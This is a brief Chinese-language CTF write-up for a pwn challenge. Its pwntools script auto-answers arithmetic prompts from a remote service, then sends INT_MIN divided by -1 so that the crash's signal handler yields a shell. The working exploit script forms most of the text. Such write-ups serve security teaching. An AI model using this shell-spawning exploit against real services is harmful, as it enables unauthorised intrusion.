## 考点

pwntools使用

signal函数报错



## 工具

pwntools



## 步骤

- 首先利用pwntools编写脚本，快速完成加法，减法，乘法的计算

- 自定义出发，int_min / -1 导致signal函数调用拿到shell

~~~python
#!/usr/bin/env python3
from pwn import *
p = process('./math')
p = remote('10.212.27.23', 12138) 
context(os='linux', arch='amd64', log_level='debug')

for i in range(20):
    p.recvuntil('numberA = :')
    a = int(p.recvuntil('\n'))
    p.recvuntil('numberB = :')
    b = int(p.recvuntil('\n'))
    log.info('a: ' + str(a))
    log.info('b: ' + str(b))
    op =  p.recvuntil(':')
    op = chr(op[-4])
    log.info('op: ' + op)
    if op == "*":
        p.sendline(str(a*b))
    elif op == "+":
        p.sendline(str(a+b))
    else:
        p.sendline(str(a-b))

p.sendlineafter("number:", str(-2147483648) + " " + str(-1))

p.interactive()
~~~




## 总结

比去年的签到难了一点，但是也算新学个东西，还是不错的
